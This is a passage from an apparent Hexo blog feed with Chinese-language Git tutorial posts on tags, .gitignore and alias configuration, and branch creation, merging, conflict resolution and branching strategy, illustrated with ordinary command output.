<p>当然了，最好在这边新建自己的分支，并且<strong>定期使用</strong><code>git pull</code>更新<code>dev</code>和<code>master</code>分支。</p>
<p> 如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to branch-name  origin/branch-name</code>即可。 </p>
<p><strong>不过由于<code>GitHub</code>可能访问不正常，国内建议使用<code>gitee</code></strong></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之标签管理</title>
    <url>/2022/02/10/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的标签管理。</p>
<a id="more"></a>

<p> 标签用于标记某一提交点，唯一绑定一个固定的<code>commitId</code>，相当于为这次提交记录指定一个别名，方便提取文件，否则会出现：</p>
<p>“阿信，快将前些天的版本打包发布，提交<code>ID</code>为马冬梅”</p>
<p>“好的，马什么梅”</p>
<p>“马冬梅”</p>
<p>“什么冬梅？”</p>
<p>“明天别来上班了！”</p>
<p>“…………”</p>
<hr>
<p>标签实际上就是指向某个<code>commit</code>的指针，只不过该指针不会移动。</p>
<h2 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h2><p>要打标签之前，首先切换到需要打标签的分支上： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p> 输入命令<code>git tag tag-name</code>就可以打一个新标签： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag v1.0</span><br></pre></td></tr></table></figure>

<p>可以用命令<code>git tag</code>查看所有标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure>

<p>默认标签是打在最新提交的<code>commit</code>上的。当然也可以打在历史提交上，创建标签时加上对应的<code>commitId</code>即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git tag v0.9 commitId</span></span><br></pre></td></tr></table></figure>

<p>用<code>show</code>命令可以查看标签的详细信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git show v1.0</span></span><br><span class="line">commit 274515d79ec8898dd098102681864fd862d68978 (HEAD -&gt; master, tag: v1.0, dev)</span><br><span class="line">Merge: e167bc0 f7f1ef6</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 16:54:01 2022 +0800</span><br><span class="line"></span><br><span class="line">    merge by no-ff</span><br></pre></td></tr></table></figure>

<h2 id="操作标签"><a href="#操作标签" class="headerlink" title="操作标签"></a>操作标签</h2><p>推送某个标签到远程，使用命令<code>git push origin tag-name</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git  push origin v1.0</span></span><br></pre></td></tr></table></figure>

<p>当然了，如果想要一次性推送多个标签也可以：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin --tags</span></span><br></pre></td></tr></table></figure>

<p>如果要删除标签，假如<code>-d</code>参数即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git tag -d v1.0</span></span><br></pre></td></tr></table></figure>

<p> 不过上述命令是删除本地的标签，如果要删除远端的标签，要先删除本地则格式为<code>git push &lt;remote_name&gt; :refs/tags/&lt;tag_name&gt;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin :refs/tags/v1.0</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之Git配置</title>
    <url>/2022/02/11/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的一些其他配置选项。</p>
<a id="more"></a>

<h2 id="忽略部分文件"><a href="#忽略部分文件" class="headerlink" title="忽略部分文件"></a>忽略部分文件</h2><p>经常使用一些框架都见项目的小伙伴应该都会发现，一些使用<code>git</code>的框架在生成项目的时候一搬都会生成一个<code>.gitignore</code>文件，该文件里边描述的是我们要求<code>Git</code>忽略的文件，每次提交和推送的时候<code>Git</code>就不会记录这些文件。</p>
<p>什么时候需要用这个呢？</p>
<ul>
<li><p>你的配置文件中有数据库密码，你不想泄露出去</p>
</li>
<li><p>依赖包过多，特别是部分前端框架！</p>
</li>
</ul>
<p><img src="https://qiniu.yalexin.top/difference.jpg" alt="1644563191198"></p>
<ul>
<li>部分操作系统自动生成的文件</li>
<li>等等</li>
</ul>
<h3 id="编写规范"><a href="#编写规范" class="headerlink" title="编写规范"></a>编写规范</h3><ul>
<li><p>所有空行或者以注释符号 <code>＃</code>开头的行都会被<code>Git</code> 忽略</p>
</li>
<li><p>可以使用标准的<code>glob</code>模式匹配</p>
</li>
<li><p>匹配模式最后跟斜杠(<code>/</code>)说明要忽略的是目录</p>
</li>
<li><p>要忽略指定模式以外的文件或目录，可以在模式前加上感叹号(<code>!</code>)进行取反</p>
</li>
</ul>
<blockquote>
<p>所谓的<code>glob</code>模式是指<code>shell</code>所使用的简化了的正则表达式，匹配规则如下：<br> <code>&quot;*&quot;</code>：星号匹配零个或多个任意字符<br> <code>[]</code>：匹配任何一个列在方括号中的字符，如[ab]匹配a或者匹配b<br> <code>&quot;?&quot;</code>：问号匹配一个任意字符<br> <code>[n-m]</code>：匹配所有在这两个字符范围内的字符，如[0-9]表示匹配所有0到9的数字</p>
</blockquote>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>附上<code>Java</code>开发通用模板</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">java</span></span><br><span class="line">*.class</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">package file</span></span><br><span class="line">*.war</span><br><span class="line">*.ear</span><br><span class="line">*.zip</span><br><span class="line">*.tar.gz</span><br><span class="line">*.rar</span><br><span class="line"><span class="meta">#</span><span class="bash">maven ignore</span></span><br><span class="line">target/</span><br><span class="line">build/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">eclipse ignore</span></span><br><span class="line">.settings/</span><br><span class="line">.project</span><br><span class="line">.classpatch</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Intellij idea</span></span><br><span class="line">.idea/</span><br><span class="line">/idea/</span><br><span class="line">*.ipr</span><br><span class="line">*.iml</span><br><span class="line">*.iws</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> temp file</span></span><br><span class="line">*.log</span><br><span class="line">*.cache</span><br><span class="line">*.diff</span><br><span class="line">*.patch</span><br><span class="line">*.tmp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> system ignore</span></span><br><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line"><span class="meta">#</span><span class="bash"> 不排除.gitignore</span></span><br><span class="line">!.gitignore</span><br></pre></td></tr></table></figure>

<p>我是小白啊！其他项目怎么办啊？不懂写该文件啊！</p>
<p>放心，<code>GitHub</code>已经帮我们写了很多模板了，我们拿过来抄答案就行了： <a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a>。</p>
<p><strong>记得新建项目后第一时间写好该文件并提交！</strong> 如果某些文件已经被纳入了版本管理中，则修改<code>.gitignore</code>是无效的。 </p>
<p>如果我们想添加的文件被写进了规则中，可以使用<code>!</code>将其排除，也可以在<code>add</code>的时候加入<code>-f</code>强制添加。</p>
<h3 id="全局-gitignore文件"><a href="#全局-gitignore文件" class="headerlink" title="全局.gitignore文件"></a>全局.gitignore文件</h3><p>上述所说的是项目级别的，我们也可以指定一个全局级别的，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global core.excludesfile  filename</span></span><br></pre></td></tr></table></figure>

<p><code>filename</code>包含路径名。</p>
<h2 id="使用命令别名"><a href="#使用命令别名" class="headerlink" title="使用命令别名"></a>使用命令别名</h2><p>熟悉<code>Linux</code>命令的同学应该都知道<code>Linux</code>支持将命令别名化，<code>Git</code>也支持该功能，为我们提升效率。</p>
<p>使用方法为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.newName oldName</span></span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.swc switch</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.cmt commit</span></span><br></pre></td></tr></table></figure>

<p>稍微复杂的也可以定制</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.log1 <span class="string">"log --graph --pretty=oneline --abbrev-commit"</span></span></span><br></pre></td></tr></table></figure>

<p>听说有人丧心病狂地把<code>lg</code>配置成了： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit"</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.yalexin.top/log.png" alt="1644566150616"></p>
<p>果然<strong>人类的懒惰推动了社会科技的进步</strong> 。可我还想多学点外语，真的！！</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之分支管理</title>
    <url>/2022/02/09/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的分支管理操作。</p>
<p><code>Git</code>的分支功能为我们团队分工提供了方便，并且每一个分支在合并之前不会对另外的分支产生影响：</p>
<a id="more"></a>

<p><img src="https://qiniu.yalexin.top/branch.drawio.png" alt></p>
<p>与分支管理相关的命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>git branch (branchname)</td>
<td>创建分支</td>
<td>git checkout/switch (branchname)</td>
<td>切换分支</td>
</tr>
<tr>
<td>git merge (branchname)</td>
<td>合并指定分支</td>
<td>git branch</td>
<td>列出所有分支</td>
</tr>
<tr>
<td>git branch -d (branchname)</td>
<td>删除指定分支</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>Git</code>默认给我们生成了一个<code>master</code>主分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* master</span><br></pre></td></tr></table></figure>

<p>我们之前说的<code>HEAD</code>指向当前版本，严格来说是指向<code>master</code>，而<code>master</code>指向的是该分支的最新提交，因此<code>HEAD</code>指向的是最新提交，熟悉类<code>C</code>语言的指针相关知识应该很容易理解这部分内容。</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio2.png" alt></p>
<h2 id="使用分支"><a href="#使用分支" class="headerlink" title="使用分支"></a>使用分支</h2><h3 id="新建分支"><a href="#新建分支" class="headerlink" title="新建分支"></a>新建分支</h3><p>新建一个前端分支<code>front</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c front</span></span><br><span class="line">Switched to a new branch 'front'</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-c</code>代表新建一个分支 <code>switch</code>代表切换分支</p>
</blockquote>
<p>确保当前所在分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* front</span><br><span class="line">  master</span><br></pre></td></tr></table></figure>

<p>在该分支下新建我们的文件<code>front.txt</code>，并提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch front.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add front.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"new front branch"</span></span></span><br></pre></td></tr></table></figure>

<p>我们再转回主分支<code>master</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>此时我们会发现我们之前新建的<code>front.txt</code>文件不见了，这是因为该文件是在<code>front</code>分支下提交的，此时的前端分支比我们的主分支“提前”。</p>
<p>同样的方法新建一个接口分支并加一个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c interface</span></span><br><span class="line">Switched to a new branch 'interface'</span><br><span class="line"><span class="meta">$</span><span class="bash"> touch interface.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add interface.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"new interface branch"</span></span></span><br><span class="line">[interface 824a607] new interface branch</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 interface.txt</span><br><span class="line"><span class="meta"> $</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>此时仓库情况如图：</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio3.png" alt></p>
<h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><p>两边的人员工作都做完了，就可以考虑合并了，毕竟一直单干啥事都干不了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge front</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge interface</span></span><br></pre></td></tr></table></figure>

<p>意思是依次将当前分支（即<code>master</code>）合并到目标分支，我们尝试合并第二个时可能会遇到下面的情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Merge branch 'interface'</span><br><span class="line"><span class="meta">#</span><span class="bash"> Please enter a commit message to explain why this merge is necessary,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> especially <span class="keyword">if</span> it merges an updated upstream into a topic branch.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Lines starting with <span class="string">'#'</span> will be ignored, and an empty message aborts</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the commit.</span></span><br></pre></td></tr></table></figure>

<p>意思是说希望我们能够给出合理的解释，为什么要合并这两个分支，我们可以直接关闭（ 按键盘左上角<code>Esc</code>，输入<code>:wq</code>即可退出）也可以写入一些信息（ 按键盘字母 <code>i</code> 进入<code>insert</code>模式并输入说明然后关闭 ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">merge front and interface</span><br></pre></td></tr></table></figure>

<p>然后我们的当前主分支下就会出现<code>front.txt</code>和<code>interface.txt</code>两个文件了。</p>
<h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><p>我们合并好分支后，对于不需要的分支可以删除，不会对我们目前的分支产生影响，因为我们当前的主分支比两个分支都“提前”，<strong>删除实际上删除的是指针</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d front</span></span><br><span class="line">Deleted branch front (was 0c93a6f).</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d interface</span></span><br><span class="line">Deleted branch interface (was 824a607).</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* master</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 844e6a7ef9d46e3386bb0e18fecef93121f1831c (HEAD -&gt; master)</span><br><span class="line">Merge: 0c93a6f 824a607</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:03:51 2022 +0800</span><br><span class="line"></span><br><span class="line">    merge front and interface</span><br><span class="line"></span><br><span class="line">commit 824a60792b798f2ae9dfb55859142c41773573ad</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 14:45:35 2022 +0800</span><br><span class="line"></span><br><span class="line">    new interface branch</span><br><span class="line"></span><br><span class="line">commit 0c93a6f1f8ca2c884040437b3568514518ffbb7a</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 14:37:57 2022 +0800</span><br><span class="line"></span><br><span class="line">    new front branch</span><br><span class="line">:</span><br></pre></td></tr></table></figure>

<p>可以发现我们的提交都没有丢失</p>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>当然了合并也不是每一次都能愉快地进行，不然前后端之间的矛盾也不会有这么多了。</p>
<p>假如前端说<code>JavaScript</code>是世界上最好的语言！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c front</span></span><br><span class="line">Switched to a new branch 'front'</span><br></pre></td></tr></table></figure>

<p>新建<code>lan.txt</code>文件并在文件中输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`JavaScript`是世界上最好的语言！</span><br></pre></td></tr></table></figure>

<p>然后提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line">warning: LF will be replaced by CRLF in lan.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"最好的语言"</span></span></span><br><span class="line">[front 2ba9fe4] 最好的语言</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 lan.txt</span><br></pre></td></tr></table></figure>

<p>而后端的人却说<code>Java</code>是世界上最好的语言！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>新建<code>lan.txt</code>文件并在文件中输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`Java`是世界上最好的语言！</span><br></pre></td></tr></table></figure>

<p>然后提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line">warning: LF will be replaced by CRLF in lan.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"最好的语言"</span></span></span><br><span class="line">[master 8ee9862] 最好的语言</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 lan.txt</span><br></pre></td></tr></table></figure>

<p>然后尝试合并</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge front</span></span><br><span class="line">Auto-merging lan.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in lan.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>

<p>这可把<code>Git</code>难住了，不同的分支对同一文件有不同的修改方式，<code>Git</code>尽最大能力也无法将其合并，现在只能我们自己手动合并冲突了。</p>
<p>我们打开<code>lan.txt</code>文件可以发现</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat lan.txt</span></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">`Java`是世界上最好的语言！</span><br><span class="line">=======</span><br><span class="line">`JavaScript`是世界上最好的语言！</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; front</span></span><br></pre></td></tr></table></figure>

<p>上面表明<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>和<code>=======</code>之间的是当前分支的内容，<code>=======</code>和<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>之间的是<code>front</code>分支的内容，我们手动将其改成</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">自然语言是世界上最好的语言！</span><br></pre></td></tr></table></figure>

<p>然后提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"你们俩别吵了"</span></span></span><br><span class="line">[master 7cec3a6] 你们俩别吵了</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 7cec3a623357cbea756a12235a995df2f85d6eed (HEAD -&gt; master)</span><br><span class="line">Merge: 8ee9862 2ba9fe4</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 16:06:57 2022 +0800</span><br><span class="line"></span><br><span class="line">    你们俩别吵了</span><br><span class="line"></span><br><span class="line">commit 8ee98627480b081d1885f8adcb7aad9580c2910c</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:55:50 2022 +0800</span><br><span class="line"></span><br><span class="line">    最好的语言</span><br><span class="line"></span><br><span class="line">commit 2ba9fe41d1379e4d57077f6d76ba7ed7e4ec55cd (front)</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:51:01 2022 +0800</span><br><span class="line"></span><br><span class="line">    最好的语言</span><br></pre></td></tr></table></figure>

<h2 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h2><h3 id="开发分支"><a href="#开发分支" class="headerlink" title="开发分支"></a>开发分支</h3><p> 通常，合并分支时，如果没有冲突，并且分支是单向一条线路继承下来的，git会使用 <code>fast forword</code>模式，但是有些快速合并不能成功，但是又没有冲突时，就会触发分支管理策略，<code>Git</code>会自动做一次新的提交。 </p>
<p>当然我们也可以手动强制禁用<code>Fast forward</code>模式，<code>Git</code>就会在<code>merge</code>时生成一个新的<code>commit</code>.</p>
<p>我们来看一下区别：</p>
<p>首先新建一个分支并修改<code>lan.txt</code>，然后使用<strong>默认方式</strong>合并</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c default</span></span><br><span class="line">Switched to a new branch 'default'</span><br><span class="line">修改lan.txt文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"default commit"</span></span></span><br><span class="line">[default e167bc0] default commit</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge default</span></span><br><span class="line">Updating 7cec3a6..e167bc0</span><br><span class="line">Fast-forward</span><br><span class="line"> lan.txt | 2 +-</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>我们再查看提交情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline --abbrev-commit --graph</span></span><br><span class="line">* e167bc0 (HEAD -&gt; master, default) default commit</span><br><span class="line">*   7cec3a6 你们俩别吵了</span><br><span class="line">|\</span><br><span class="line">| * 2ba9fe4 最好的语言</span><br><span class="line">* | 8ee9862 最好的语言</span><br><span class="line">|/</span><br><span class="line">*   844e6a7 merge front and interface</span><br><span class="line">|\</span><br><span class="line">| * 824a607 new interface branch</span><br><span class="line">* | 0c93a6f new front branch</span><br><span class="line">|/</span><br><span class="line">* dcfdaa2 3</span><br><span class="line">* e54198e second commit</span><br><span class="line">* bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>合并情况如图所示</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio4.png" alt></p>
<p>让我们再来个禁用<code>Fast forward</code>模式的合并</p>
<p>新建一个分支并修改<code>lan.txt</code>，然后使用<strong>禁用<code>Fast forward</code>模式</strong>合并</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c noFast</span></span><br><span class="line">Switched to a new branch 'noFast'</span><br><span class="line">修改lan.txt文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"noFast commit"</span></span></span><br><span class="line">[noFast f7f1ef6] noFast commit</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge by no-ff"</span> noFast</span></span><br><span class="line">Merge made by the 'ort' strategy.</span><br><span class="line"> lan.txt | 3 ++-</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline --abbrev-commit --graph</span></span><br><span class="line">*   274515d (HEAD -&gt; master) merge by no-ff</span><br><span class="line">|\</span><br><span class="line">| * f7f1ef6 (noFast) noFast commit</span><br><span class="line">|/</span><br><span class="line">* e167bc0 (default) default commit</span><br><span class="line">*   7cec3a6 你们俩别吵了</span><br><span class="line">|\</span><br><span class="line">| * 2ba9fe4 最好的语言</span><br><span class="line">* | 8ee9862 最好的语言</span><br><span class="line">|/</span><br><span class="line">*   844e6a7 merge front and interface</span><br><span class="line">|\</span><br><span class="line">| * 824a607 new interface branch</span><br><span class="line">* | 0c93a6f new front branch</span><br><span class="line">|/</span><br><span class="line">* dcfdaa2 3</span><br><span class="line">* e54198e second commit</span><br><span class="line">* bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>合并情况如图所示</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio5.png" alt></p>
<p>即会<strong>自动提交一次</strong>。</p>
<p>有了上述清晰的认识以后，我们以后在日常使用<code>Git</code>开发的时候应该要秉承在<code>master</code>尽量少提交的理念，即尽可能稳定，最好只用来发布版本，然后在分支<code>dev</code>上进行日常开发，每逢大版本更新的时候再把它合并到主分支上面；当然了，在分工明确的前提下，每个人应该至少有属于自己的分支，然后定期合并到<code>dev</code>。</p>
<h3 id="临时分支"><a href="#临时分支" class="headerlink" title="临时分支"></a>临时分支</h3><p>前面讲到版本库的两条主要分支：<code>master</code>和<code>dev</code>。前者用于正式发布，后者用于日常开发。其实，常设分支只需要这两条就够了，不需要其他了。</p>
<p>但是，除了常设分支以外，还有一些临时性分支，用于应对一些特定目的的版本开发。临时性分支主要有三种：</p>
<ul>
<li>功能（<code>feature</code>）分支</li>
<li>预发布（<code>release</code>）分支</li>
<li>修补bug（<code>fixbug</code>）分支</li>
</ul>
<p>这三种分支都属于临时性需要，使用完以后，应该删除，使得代码库的常设分支始终只有<code>master</code>和<code>dev</code>。</p>
<h4 id="功能分支"><a href="#功能分支" class="headerlink" title="功能分支"></a>功能分支</h4><p> 它是为了开发某种特定功能，从<code>dev</code>分支上面分出来的，开发完成后，要再并入<code>dev</code>， 功能分支的名字，可以采用<code>feature-name</code>的形式命名。 </p>
<h4 id="预发布分支"><a href="#预发布分支" class="headerlink" title="预发布分支"></a>预发布分支</h4><p>预发布分支，它是指发布正式版本之前（即合并到<code>master</code>分支之前），我们可能需要有一个预发布的版本进行测试。预发布分支是从<code>dev</code>分支上面分出来的，预发布结束以后，必须合并进<code>dev</code>和<code>master</code>分支。它的命名，可以采用<code>release-*</code>的形式。</p>
<h4 id="修补分支"><a href="#修补分支" class="headerlink" title="修补分支"></a>修补分支</h4><p>软件正式发布以后，难免会出现<code>bug</code>。这时就需要创建一个分支，进行<code>bug</code>修补。</p>
<p>修补<code>bug</code>分支是从<code>master</code>分支上面分出来的。修补结束以后，再合并进<code>master</code>和<code>deev</code>分支。它的命名，可以采用<code>fixbug-*</code>的形式。</p>
<p>这里有一个场景，你手头上的工作还没做完，但是你接到一个比较紧急的修复任务的时候，你又不想暂时提交这半截子代码，该怎么办？</p>
<p><code>Git</code>提供了<code>stash</code>命令，它把所有未提交的修改（包括暂存的和非暂存的）都保存起来，用于后续恢复当前工作目录。 </p>
